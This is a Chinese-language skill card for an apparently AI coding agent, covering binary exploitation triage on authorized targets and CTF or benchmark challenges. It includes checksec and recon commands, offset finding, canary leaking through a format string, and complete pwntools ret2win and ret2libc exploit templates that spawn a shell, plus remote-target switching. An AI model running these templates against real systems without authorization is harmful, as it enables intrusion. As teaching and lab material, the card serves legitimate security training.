---
name: 器胚破核
description: >-
 授权目标/靶场上的通用二进制 Pwn 初筛与作业路由：保护位、敏感字符串、ROP gadget 摘要。
 
  看懂炸点要写稳定 exploit / 远程打不通 → `pwn-chain`，不要两张一起当主卡。
  看不懂该用 IDA/Ghidra/Go 卡时先切 reverse-engineering。
  若画像匹配 Node/.node/BPP 协议，优先切 bpp-node-exploit-chain，勿只停在本 Skill。
 若出现 X-Alloc-Bins / zend_mm / custom_auth.so / debug input_len /
 PHP 自定义扩展堆，切 幻页·堆隙（先 strings/凭据，禁止先堆喷）。
 旧名 `heap-exploitation` / `echoes-of-heap-exploit` 已并入本卡（Zend 堆仍先读上述手法）。
---

# 二进制 Pwn 基础（Cursor Skill）

## 何时用

- 拿到 ELF / 漏洞程序，需要快速定保护与利用方向
- Tsecbench「二进制」类题开局
- 非 BPP 的通用 pwn（栈、ret2libc、ROP）
- PHP 自定义 `.so` + `X-Alloc-Bins` / `zend_mm` / `input_len` 调试回显（**先切 Zend 堆卡**）

## 真源（按序）

1. `X-Alloc-Bins` / `zend_mm` / `custom_auth.so` / `<!-- debug: input_len=` → **`传承/幻页·堆隙.md`**（先备份+.so+strings，禁止先堆喷）
2. `tools/pwn-kit/pwn_triage.py`
3. `传承/破核·基础.md`
4. arsenal：`gdb` `objdump` `ROPgadget` `pwntools`（`source scripts/arsenal-env.sh`）
5. 匹配 BPP 画像 → `杀招/果核`
6. 长文：九阶段 `reverse-engineering` / `exploit-development-framework`

## 强制步骤

1. `source scripts/arsenal-env.sh`；`pwn_triage.py doctor`
2. `pwn_triage.py triage --bin <路径> --case <案卷>`
3. 需要 gadget：`pwn_triage.py gadgets --bin <路径> --case <案卷>`
4. 按 `next` 字段选型：shellcode / ret2libc / 泄基址 / 切 BPP
5. 证据：`案卷/<案卷>/案卷/pwn/`

## 版本适配（任意写 → RCE）

glibc ≥ 2.34 已移除 `__free_hook` / `__malloc_hook`。有任意写时改走：GOT、`system`、ROP、`modprobe_path`（内核）、见 `arbitrary-write-to-rce`。  
无 shell 只报「内存破坏-未利用」，不算 L3。

Exploit 流程：保护嗅探 → 原语 → 泄露 → 定向 → 逐缓解验证。工具缺失（pwntools/gdb）警告后降级静态分析。

## 不要做

- 无授权对他人生产二进制武器化利用
- BPP 十步链场景只用本 Skill 敷衍
- 跳过 triage 直接瞎喷超长 ROP
- 把 Zend `input_len` Echo 当成 Spring heapdump；多实例不比 `.so` 就宣布凭据无效

---

## 一、环境准备

```bash
# 激活 pwn 环境
source scripts/arsenal-env.sh

# 检查工具链
pwn_triage.py doctor
# 期望看到：gdb(pwndbg) ✓ pwntools ✓ ROPgadget ✓ objdump ✓

# 快速安装（若缺失）
pip3 install pwntools ROPgadget
apt-get install -y gdb gdbserver binutils 2>/dev/null || \
 brew install gdb binutils 2>/dev/null
```

---

## 二、第一步：保护位分析（checksec）

```bash
# 自动 triage（推荐）
python3 tools/pwn-kit/pwn_triage.py triage \
 --bin /path/to/target \
 --case <案卷> \
 --out 案卷/<案卷>/案卷/pwn/

# 手动 checksec
checksec --file=/path/to/target 2>/dev/null || \
python3 -c "
from pwn import *
elf = ELF('/path/to/target', checksec=False)
print('ARCH:', elf.arch)
print('Bits:', elf.bits)
print('RELRO:', elf.relro)
print('Canary:', elf.canary)
print('NX:', elf.nx)
print('PIE:', elf.pie)
print('ASLR: check /proc/sys/kernel/randomize_va_space')
"

# 解读保护位
# RELRO: No → GOT可写; Full → GOT只读
# Canary: Yes → 需泄露或绕过 canary
# NX: Yes → 不能注入 shellcode
# PIE: Yes → 需泄露基址; No → 固定地址
```

---

## 三、第二步：逆向分析

```bash
# strings 提取敏感信息（密码、flag 格式、函数名）
strings /path/to/target | grep -iE 'flag|pass|secret|admin|key|token|cat|system|/bin/' | head -30

# objdump 反汇编（快速看 main 和关键函数）
objdump -d /path/to/target | grep -A 30 '<main>:'
objdump -d /path/to/target | grep -A 20 '<vuln\|overflow\|gets\|read\|scanf>:'

# 符号表（有符号时）
objdump -t /path/to/target | grep -iE 'win|system|flag|backdoor|shell' | head -20

# PLT/GOT 表
objdump -d /path/to/target | grep '@plt' | head -20
readelf -r /path/to/target | head -30

# 使用 pwntools ELF 分析
python3 -c "
from pwn import *
elf = ELF('/path/to/target', checksec=False)
print('Entry:', hex(elf.entry))
print('Main:', hex(elf.symbols.get('main', 0)))
print('System:', hex(elf.plt.get('system', 0)))
print('puts plt:', hex(elf.plt.get('puts', 0)))
print('puts got:', hex(elf.got.get('puts', 0)))
print('/bin/sh:', hex(next(elf.search(b'/bin/sh\x00'), 0)))
print('win func:', hex(elf.symbols.get('win', 0)))
"
```

---

## 四、第三步：漏洞定位

### 4.1 危险函数扫描

```bash
# 检查危险函数使用
objdump -d /path/to/target | grep -E 'gets|scanf|strcpy|strcat|sprintf|read@plt|memcpy'

# GDB 静态分析
gdb -q /path/to/target -ex 'info functions' -ex quit 2>/dev/null | grep -iE 'vuln|overflow|read|gets'
```

### 4.2 栈溢出 offset 确定

```python
from pwn import *

# 生成 cyclic 模式（De Bruijn sequence）
pattern = cyclic(200)
print("Pattern:", pattern[:50], "...")
# 发送给程序，gdb 里看崩溃时 RSP/EIP 的值
# cyclic_find(0x6161616e) → offset

# 或用 pwndbg: pattern create 200 / pattern offset <addr>
```

```bash
# GDB 调试确定 offset
gdb /path/to/target -ex 'run' << 'EOF'
python3 -c "from pwn import cyclic; print(cyclic(200).decode())"
EOF
# 崩溃后: x/wx $rsp 或 info registers rip
# gdb pwndbg: cyclic -l <crash_addr>
```

### 4.3 Canary 泄露

```python
from pwn import *

# 若程序有格式字符串漏洞，先泄露 canary
# Canary 在 rbp-0x8，格式字符串 %7$p 等（需调试确认偏移）
io = process('./target')
io.sendlineafter(b'Input:', b'%7$p.%8$p.%9$p.%10$p')
leak = io.recvline()
print("Leak:", leak)
# 找以 \x00 结尾的值（canary 低字节为 0）
```

---

## 五、第四步：利用模板

### 5.1 ret2win（有 win/backdoor 函数，无 PIE）

```python
from pwn import *

# 配置
elf = ELF('./target', checksec=False)
context.binary = elf
context.log_level = 'debug'

# 找 win 函数地址
WIN = elf.symbols['win'] # 或 elf.symbols['backdoor']
print(f"win @ {hex(WIN)}")

# 确定 offset（cyclic 找到的值）
OFFSET = 72 # 替换为实际值

# 构造 payload
payload = b'A' * OFFSET
# 64位需要栈对齐（ret 指令补 1 个）
RET_GADGET = 0x401016 # 从 ROPgadget 找 "ret" 指令
payload += p64(RET_GADGET) # 栈对齐（有时需要）
payload += p64(WIN)

# 本地测试
io = process('./target')
io.sendlineafter(b'Input:', payload)
print(io.recvall(timeout=3))
```

### 5.2 ret2libc（有 puts/printf，无 PIE 或泄露基址）

```python
from pwn import *

elf = ELF('./target', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) # 或题目提供的 libc
context.binary = elf

# 第一阶段：泄露 libc 基址
POP_RDI = 0x0000000000401233 # ROPgadget --binary target | grep "pop rdi"
RET = 0x000000000040101a # ROPgadget --binary target | grep ": ret$"
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
MAIN = elf.symbols['main']

OFFSET = 72 # 替换

payload1 = b'A' * OFFSET
payload1 += p64(POP_RDI) + p64(PUTS_GOT)
payload1 += p64(PUTS_PLT)
payload1 += p64(MAIN) # 返回 main 做第二阶段

io = process('./target') # 或 remote(IP, PORT)
io.sendlineafter(b'Input:', payload1)
io.recvline() # 跳过提示
leaked = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
print(f"libc base: {hex(libc.address)}")

# 第二阶段：getshell
SYSTEM = libc.symbols['system']
BIN_SH = next(libc.search(b'/bin/sh\x00'))
payload2 = b'A' * OFFSET + p64(RET) + p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM)
io.sendlineafter(b'Input:', payload2)
io.interactive()
```

### 5.3 ROP Gadget 搜索

```bash
# 搜索所有 gadget
ROPgadget --binary /path/to/target | grep -E 'pop rdi|pop rsi|pop rdx|ret$|syscall' | head -20

# 通过 pwn_triage.py 自动搜索
python3 tools/pwn-kit/pwn_triage.py gadgets \
 --bin /path/to/target --case <案卷>

# pwntools ROP 自动化
python3 -c "
from pwn import *
elf = ELF('./target', checksec=False)
rop = ROP(elf)
print(rop.find_gadget(['pop rdi', 'ret']))
print(rop.find_gadget(['ret']))
"
```

---

## 六、第五步：远程利用（CTF/授权靶机）

```python
from pwn import *

# 本地 vs 远程切换
LOCAL = False # 改 True 做本地测试

if LOCAL:
 io = process('./target')
else:
 io = remote('<授权IP>', <端口>)

# ... 利用代码 ...
io.interactive()
```

---

## 七、常见保护位对应利用路线

| NX | PIE | Canary | 推荐利用路线 |
|----|-----|--------|------------|
| No | No | No | 注入 shellcode → jmp esp/jmp rsp |
| Yes | No | No | ret2win / ret2libc / ROP |
| Yes | No | Yes | 先泄露 canary → ret2libc |
| Yes | Yes | No | 先泄露基址 → ret2libc |
| Yes | Yes | Yes | 需要信息泄露+canary+基址三合一 |

---

## 八、GDB 调试命令速查

```bash
# pwndbg 常用命令
gdb ./target
(gdb) run < <(python3 -c "from pwn import cyclic; import sys; sys.stdout.buffer.write(cyclic(200))")
(gdb) pattern offset $rsp # 找 offset
(gdb) checksec # 查保护位
(gdb) info functions # 所有函数
(gdb) disas main # 反汇编 main
(gdb) x/20gx $rsp # 查栈内容
(gdb) vmmap # 内存映射（pwndbg）
(gdb) canary # 显示 canary（pwndbg）
```

---

## 九、证据写入

```bash
mkdir -p 案卷/<案卷>/案卷/pwn/
# 保存 checksec 结果
python3 tools/pwn-kit/pwn_triage.py triage --bin /path/to/target --case <案卷>
# 保存 exploit 脚本
cp exploit.py 案卷/<案卷>/案卷/pwn/
# 保存 flag（若CTF）
echo "flag{...}" > 案卷/<案卷>/案卷/pwn/flag.txt
```
